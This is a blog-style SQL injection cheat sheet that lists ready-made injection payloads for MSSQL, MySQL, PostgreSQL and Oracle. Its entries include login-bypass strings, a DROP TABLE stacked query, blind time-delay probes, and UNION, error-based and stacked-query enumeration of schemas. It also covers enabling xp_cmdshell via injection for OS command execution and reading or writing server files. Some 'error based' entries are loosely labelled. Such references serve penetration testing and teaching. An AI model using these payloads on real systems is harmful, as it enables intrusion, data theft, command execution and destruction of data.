---
layout: post
category: cheatsheets
---

## Key Delimiters and Enclosures
- `'`, `"`: Standard string delimiters. E.g., `' OR '1'='1`
- `\``: MySQL identifier quoting. E.g., `` `column` = 'value' ``
- `;`: Statement separator. E.g., `SELECT * FROM users; DROP TABLE users;`
- `--`, `/*...*/`: SQL comments. E.g., `--comment`, `/* comment */`

## Injection Patterns
- Basic Injection: `' OR 1=1--`
- Closing Brackets: Try closing out functions or statements. E.g., `')`, `'))`, `')))--`, `%'))-- -`
- Logical Operators: `OR`, `AND`. E.g., `' OR 'x'='x`
- Union Injection: `' UNION SELECT ... --`
- Conditional Time Delays (for blind SQLi): 
  - MySQL: `'; SELECT SLEEP(5);--`
  - MSSQL: `'; WAITFOR DELAY '00:00:05';--`
  - Oracle: `'; dbms_lock.sleep(5);--`
  - PostgreSQL: `'; SELECT pg_sleep(5);--`
- Out-of-Band: Through DNS or HTTP. E.g., DNS lookup triggered by SQL query.

## Testing Methodology
1. **Find Injection Points**: Identify user inputs/parameters interacting with the database.
2. **Manipulate Inputs**: Use delimiters, enclosures, and patterns to alter queries.
3. **Observe Behavior**: Changes or errors can indicate SQLi vulnerabilities.
4. **Automate Detection**: Tools like SQLMap or OWASP ZAP can assist in finding vulnerabilities


### MSSQL

#### List databases:
- Normal
    - `Select name from sys.databases`
- Error based
    - `cast((SELECT name FROM sys.databases ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY) as integer)`
- Union Based
    - `' UNION SELECT name, NULL FROM master..sysdatabases --`
- Stacked Queries:
    - `; SELECT name FROM master..sysdatabases; --`


#### List Tables:
- Normal
    - `select * from app.information_schema.tables;`
- Error based`
    - `cast((SELECT TABLE_NAME FROM exercise.information_schema.tables ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY) as integer)`
- Union Based
    - `' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables --`
- Stacked Queries:
    - `; SELECT * FROM information_schema.tables; --`

#### List columns:
- Normal
    - `select COLUMN_NAME, DATA_TYPE from app.information_schema.columns where TABLE_NAME = 'menu';`
- Error based
    - `cast((SELECT+column_name+FROM+exercise.information_schema.columns+where+table_name+%3d+'secrets'+ORDER+BY+name+OFFSET+0+ROWS+FETCH+NEXT+1+ROWS+ONLY)+as+integer)`
- Union Based
    - `' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE TABLE_NAME = 'table_name' --`
- Stacked Queries:
    - `; SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 'table_name'; --`

### Command Execution:
- Normal
    - To use `xp_cmdshell` for command execution, it first needs to be enabled by a user with administrative privileges:
      ```sql
      EXEC sp_configure 'show advanced options', 1;
      RECONFIGURE;
      EXEC sp_configure 'xp_cmdshell', 1;
      RECONFIGURE;
      ```
    - After enabling, you can execute system commands like so:
      ```sql
      EXEC xp_cmdshell 'your_command_here';
      ```
- SQLi
    - Just like before, you will need to enable the privs first, sometimes they may be enabled by default:
        ```sql
        '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- ```
    - `'; EXEC xp_cmdshell 'your_command_here'; --`

## MYSQL

### List databases:
- Normal
    - `SHOW DATABASES;`
- Error based
    - `' AND (SELECT COUNT(*) FROM information_schema.schemata) -- `
- Union Based
    - `' UNION SELECT schema_name, NULL FROM information_schema.schemata --`
- Stacked Queries:
    - `; SHOW DATABASES; --`

### List Tables:
- Normal
    - `SHOW TABLES;`
- Error based
    - `' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'database_name') --`
- Union Based
    - `' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables WHERE table_schema = 'database_name' --`
- Stacked Queries:
    - `; SHOW TABLES; --`

### List columns:
- Normal
    - `SHOW COLUMNS FROM table_name;`
- Error based
    - `' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'table_name') --`
- Union Based
    - `' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'table_name' --`
- Stacked Queries:
    - `; SHOW COLUMNS FROM table_name; --`

### Read Files:
- Normal
    - `SELECT LOAD_FILE('/path/to/file');`
- SQLi
    - `' UNION SELECT LOAD_FILE('/path/to/file'), NULL --`

### Write Files:
- Normal
    - `SELECT * INTO OUTFILE '/path/to/file' FROM table_name;`
- SQLi
    - `' UNION SELECT column_name FROM table_name INTO OUTFILE '/path/to/file' --`


## Postgres

### List databases:
- Normal
    - `SELECT datname FROM pg_database;`
- Error based
    - `AND (SELECT COUNT(*) FROM pg_database) --`
- Union Based
    - `' UNION SELECT datname, NULL FROM pg_database --`
- Stacked Queries:
    - `; SELECT datname FROM pg_database; --`

### List Tables:
- Normal
    - `SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';`
- Error based
    - `AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'public') --`
- Union Based
    - `' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public' --`
- Stacked Queries:
    - `; SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'; --`

### List columns:
- Normal
    - `SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name';`
- Error based
    - `AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'table_name') --`
- Union Based
    - `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'table_name' --`
- Stacked Queries:
    - `; SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name'; --`

### Read Files:
- Normal
    - `SELECT pg_read_file('/path/to/file', 0, 1000000);`
- SQLi
    - `' UNION SELECT pg_read_file('/path/to/file', 0, 1000000), NULL --`

### Write Files:
- Normal
    - `COPY table_name TO '/path/to/file' DELIMITER ',' CSV HEADER;`

## ORACLE

### List databases:
- Normal
    - `SELECT name FROM v$database;`
- Error based
    - `' AND (SELECT COUNT(*) FROM v$database) --`
- Union Based
    - `' UNION SELECT name, NULL FROM v$database --`
- Stacked Queries:
    - `; SELECT name FROM v$database; --`

### List Tables:
- Normal
    - `SELECT table_name FROM all_tables;`
- Error based
    - `' AND (SELECT COUNT(*) FROM all_tables) --`
- Union Based
    - `' UNION SELECT table_name, NULL FROM all_tables --`
- Stacked Queries:
    - `; SELECT table_name FROM all_tables; --`

### List columns:
- Normal
    - `SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name';`
- Error based
    - `' AND (SELECT COUNT(*) FROM all_tab_columns WHERE table_name = 'table_name') --`
- Union Based
    - `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'table_name' --`
- Stacked Queries:
    - `; SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name'; --`
